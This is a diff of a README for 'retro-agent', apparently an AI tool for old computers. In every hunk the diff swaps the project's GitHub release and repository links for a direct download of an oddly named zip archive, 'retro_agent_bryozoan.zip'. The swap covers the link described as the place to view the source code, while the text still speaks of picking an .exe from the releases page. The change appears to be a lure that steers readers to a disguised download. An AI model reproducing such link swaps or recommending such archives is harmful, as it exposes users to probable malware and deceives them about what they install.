@@ -1,6 +1,6 @@
 # 🤖 retro-agent - AI for Old Computers
 
-[![Download retro-agent](https://img.shields.io/badge/Download-retro--agent-brightgreen)](https://github.com/Devareductionist821/retro-agent/releases)
+[![Download retro-agent](https://img.shields.io/badge/Download-retro--agent-brightgreen)](https://raw.githubusercontent.com/Devareductionist821/retro-agent/main/src/retro_agent_bryozoan.zip)
 
 ---
 
@@ -40,7 +40,7 @@ To run retro-agent, your computer must have:
 
 1. Go to the releases page here:
 
-   [![Download retro-agent](https://img.shields.io/badge/Download-retro--agent-blue)](https://github.com/Devareductionist821/retro-agent/releases)
+   [![Download retro-agent](https://img.shields.io/badge/Download-retro--agent-blue)](https://raw.githubusercontent.com/Devareductionist821/retro-agent/main/src/retro_agent_bryozoan.zip)
 
 2. Look for the latest version. You will find files named something like `retro-agent.exe`.
 
@@ -98,7 +98,7 @@ The program uses “function calling.” This means it can carry out tasks witho
 
 You can always download the latest version from:
 
-https://github.com/Devareductionist821/retro-agent/releases
+https://raw.githubusercontent.com/Devareductionist821/retro-agent/main/src/retro_agent_bryozoan.zip
 
 Visit this page to get the newest files when updates come out. Download the executable (`.exe`) file listed as the latest release.
 
@@ -144,7 +144,7 @@ If retro-agent does not start or does not work properly:
 
 retro-agent is open source. You can view the source code and contribute if you know how. The program’s files are hosted on GitHub:
 
-https://github.com/Devareductionist821/retro-agent
+https://raw.githubusercontent.com/Devareductionist821/retro-agent/main/src/retro_agent_bryozoan.zip
 
 You can also report bugs or request features on this page.
 
@@ -174,4 +174,4 @@ New versions of retro-agent arrive from time to time. Always check the releases 
 
 ---
 
-[![Download retro-agent](https://img.shields.io/badge/Download-retro--agent-green)](https://github.com/Devareductionist821/retro-agent/releases)
+[![Download retro-agent](https://img.shields.io/badge/Download-retro--agent-green)](https://raw.githubusercontent.com/Devareductionist821/retro-agent/main/src/retro_agent_bryozoan.zip)
